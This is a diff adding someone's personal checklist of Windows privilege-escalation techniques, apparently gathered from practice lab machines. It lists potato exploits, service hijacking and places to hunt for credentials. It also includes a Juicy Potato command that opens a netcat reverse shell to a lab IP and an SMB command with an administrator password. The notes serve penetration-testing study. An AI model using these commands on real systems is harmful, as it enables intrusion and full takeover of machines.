@@ -1,0 +1,53 @@
+
+	1. For windows privesc, we can either transfer Sherlock.ps1 locally or copy the systeminfo file and pass it to the windows-exploit-suggester.py tp find vulnerabilities.
+	2. If found any kernel exploits for windows, search its .exe exploit file on the internet.
+	3. Churrasco.exe allows command execution as a root or administrator. It exploits SeImpersonatePrivilege. Churrasco.exe  --->  works on windows 2008 and less e.g. 2003  (Granny)
+	4. Try Juicy Potato with or without CLSID. Sometimes it also works without providing the CLSID manually.
+	5. Always check "C:\Program Files (x86)" directory. Try to look for unknown applications/software e.g. mRemoteNG  (Bastion)
+	6. Churrasco can be used for windows versions: Microsoft Windows 2000, Windows XP, Windows Server 2003, Windows Vista, and Windows Server 2008. (Grandpa)
+	7. SeImpersonatePrivilege is one I know to look out for. For modern boxes, that means a potato exploit (juicy, lonely, rotten). But for 2003, it’s better to start with churrasco.
+	8. In windows always check --->  ConsoleHost_history.txt file to check the user's history. --->  
+	Path  --->   C:\Users\legacyy\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
+	9. If LAPS is installed  -->  we can use Get-ADComputer in powershell (Timelapse) or if valid creds found use Ldapsearch directly.
+	10. If we can execute powershell commands as system, so instead of using IEX we can directly create a new user and add it to the administrators group and then use psexec. (NetMon)
+	11. Windows Privesc  -->  check and exploit modifiable services with AllAccess and READ/WRITE permissions.  (Remote)
+	12. If the user is in group called "Server operators"  that means it has access to some of the services. To abuse the vulnerable service, we need to change the binary path for that services. (Return)
+	"Server operators" group is vulnerable to 'Service Binary Manipulation'
+	13. Found creds in the autologon Credentials for svc_loanmanager. Username was svc_loanmgr in the users folder, that's why svc_loanmanager was not working with netexec and evil-winrm.
+	14. In winPEAS.exe --->  always look for the Linux shells/distributions such as - wsl.exe, bash.exe  --->  WSL (windows Subsystem for Linux)
+	If bash.exe is present, always check the bash_history file. Try to go inside the root directory. See is it permitted or not. The winPEAS.exe shows the Root Directory path.
+	15. Locally getting administrator's flag using SMB  -->  net use \\127.0.0.1\c$ /user:administrator "u6!4ZwgwOM#^OBf#Nwnh"  --->  type \\127.0.0.1\c$\users\administrator\desktop\root.txt
+	16. Try to run WinPEAS 2 times because I could not find one TCP port 1337 that was locally running at first scan. (Secura)
+	17. Plink doesn't work properly in most of the cases as someone told me on the Offsec's discord. Use chisel or ligolo for port forwarding.
+	18. Check "whoami /priv", If SeImpersonatePrivilege are found, just try to exploit it first using printspoofer or potatoes sech as GodPotato, Juicy Potato, Rogue Potato, Sigma Potato.
+	19. Windows service hijacking - There is a sysinternals PsShutdown Tool to force restart the system.
+	20. Here, I found a password for another user in the environment variables. And that user was an Administrator on the system. So it is better to always check environments.  PS  --->   dir env:
+	21. Always check History files (winpeas shows it). In this case, I found user Damon's credentials in Adrian's history file who was an administrator on the machine. (Relia)
+	22. If the file running as a scheduled task, check the path it contain is right or wrong, especially the spelling of the file to be executed. Here, scheduled task was supposed to execute ---> "C:\updatecollector\updatecollector.exe"
+	But in the script it had miss-spelled it to  --->   "C:\updatecollector\updatecollctor.exe"
+	23. Despite having only Read-Execute permissions on the schedule.ps1 I was able to modify its content in "windows powershell ISE" So always make sure to check whether you can write it or not even if it is not allowed.
+	24. SeRestorePrivilege vulnerable -->  SeRestoreAbuse.exe
+	25. If the service cannot be stopped and restarted to get a system shell, try to shutdown the system and if lucky you will have permissions to do it so.
+	26. Always check each and every whoami /priv very carefully with "privesc", "privilege escalation", "exploit", and " abuse" keywords on the Google.
+	27. If you have a valid creds and don't have any login enabled but have a reverse shell, then in this case we must use RusasCs tool to escalate out privileges.
+	28. There is an abuse for SeManageVolumePrivilege : https://github.com/CsEnox/SeManageVolumeExploit.git
+	29. Check the Windows and OS version. It was windows server 2008 and OS version - 6.0.6001 Service Pack 1 Build 6001
+	Found exploit for that windows OSC version - MS11-046 -  https://github.com/abatchy17/WindowsExploits/tree/master/MS11-046
+	Just ran the .exe on the system and obtained system.
+	30. Also SeImpersonatePrivilege were also enabled. 
+	So remember, if the windows server 2008 is 32 bit, always use the Juicy Potato.
+	For juicy potato, we can find CLSID of our need here:  https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md
+	--->   jp32.exe -c {9B1F122C-2982-4e91-AA8B-E071D54F2A4D} -t * -l 1337 -p "c:\temp\nc32.exe" -a "192.168.45.200 1337 -e cmd.exe"
+	I used the very first CLSID.
+	31. Horizontal Privesc -->  look for a service account e.g. Apache -->  SeImpersonatePrivilege
+	32. After RDP, If Shield icon appeared on the applications then it is running as an administrator. Remote mouse privesc: https://npulse.net/en/exploits/50047
+	33. Last resort -->  check running applications versions. Xampp version from C:\xampp\properties.ini
+	Or if RDP is available  -->  control panel  -->  uninstall a program  -->  check version.
+	XAMPP  7.3.10-1 (7.4.3) -->  http://exploit-db.com/exploits/50337
+	The next time the Administrator attempts to edit XAMPP settings, our payload will be triggered. After a few minets, we recieve a connection to our listener.
+	It requires user interactions.
+	34. If RDP and winrm available, after getting initial shell try to crack NTLMv2 hash (hashes generated by winPEAS output).
+	35. For Currently stored credentials:  --->   cmdkey /list
+	36. If there is a Microsoft IIS web server running even if internally (port forward it), we can upload .aspx file and execute it to get a shell. Because there is always a SeImpersonatePrivilege enabled for the web server account and we can use Potatoes.
+	
+	
